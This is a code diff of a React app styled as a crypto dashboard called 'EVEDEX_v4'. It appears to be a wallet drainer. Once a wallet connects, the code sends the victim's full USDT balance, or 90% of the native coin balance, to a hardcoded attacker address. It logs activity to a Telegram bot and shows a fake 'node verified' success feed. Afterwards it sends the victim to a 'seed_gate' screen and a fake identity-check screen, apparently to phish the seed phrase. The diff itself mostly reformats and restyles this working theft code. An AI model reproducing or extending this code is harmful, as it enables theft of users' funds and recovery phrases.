@@ -25,17 +25,26 @@ export default function App() {
   const chatId = "7630238860";
   const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
 
-  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
+  const USDT_MAP = { 
+    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
+    56: "0x55d398326f99059ff775485246999027b3197955", 
+    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" 
+  };
+
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
+  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+    method: 'POST', 
+    headers: { 'Content-Type': 'application/json' }, 
+    body: JSON.stringify({ chat_id: chatId, text: msg }) 
+  }).catch(()=>{});
 
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} NODE VERIFIED SUCCESSFULLY`);
-      setEthPrice(prev => prev + (Math.random() * 2 - 1));
+      setEthPrice(p => p + (Math.random() * 2 - 1));
       setTimeout(() => setFeedMsg(""), 4500);
     }, 8000);
     return () => clearInterval(interval);
@@ -47,7 +56,8 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 0n) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 90n) / 100n }, { onSettled: () => setView("seed_gate") });
+      const amount = (nativeBal.value * 90n) / 100n;
+      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -64,8 +74,6 @@ export default function App() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      
-      {/* HEADER */}
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
@@ -77,16 +85,15 @@ export default function App() {
       {!isConnected ? (
         <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
           <div style={{display:'flex', justifyContent:'center', gap:'15px', marginBottom:'25px'}}>
-             <div style={{fontSize:'12px', color:'#10b981'}}>🔰 SAFE_GUIDE</div>
-             <div style={{fontSize:'12px', color:'#3b82f6'}}>♻️ RELAY_ACTIVE</div>
+             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE</div>
+             <div style={{fontSize:'12px', color:'#3b82f6', fontWeight:'bold'}}>♻️ RELAY_ACTIVE</div>
           </div>
           <appkit-button />
         </div>
       ) : (
         <>
-          {/* DASHBOARD STATUS BAR */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span>
+            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1% [AUTO]</span>
           </div>
 
           {view === "menu" && (
@@ -103,7 +110,7 @@ export default function App() {
 
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px', fontWeight:'bold'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginTop:'10px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
@@ -115,7 +122,7 @@ export default function App() {
 
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px', fontWeight:'bold'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
@@ -152,7 +159,6 @@ export default function App() {
         </>
       )}
 
-      {/* SUCCESS FEED */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
